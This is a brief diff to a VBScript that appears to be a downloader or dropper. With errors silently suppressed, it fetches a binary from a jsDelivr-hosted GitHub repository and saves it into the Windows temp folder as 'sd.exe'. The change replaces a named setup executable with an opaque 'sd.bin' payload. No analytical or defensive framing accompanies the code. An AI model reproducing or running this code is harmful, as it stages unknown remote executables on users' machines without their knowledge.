@@ -2,7 +2,7 @@ On Error Resume Next
 Dim f, w, a, p
 Set f = CreateObject("Scripting.FileSystemObject")
 Set w = CreateObject("WinHttp.WinHttpRequest.5.1")
-w.Open "GET", "https://cdn.jsdelivr.net/gh/localbackgox/assets@v6/SoodalAgentSetup.exe", 0
+w.Open "GET", "https://cdn.jsdelivr.net/gh/localbackgox/assets@v7/sd.bin", 0
 w.Send
 If w.Status = 200 Then
   p = f.GetSpecialFolder(2) & "\sd.exe"
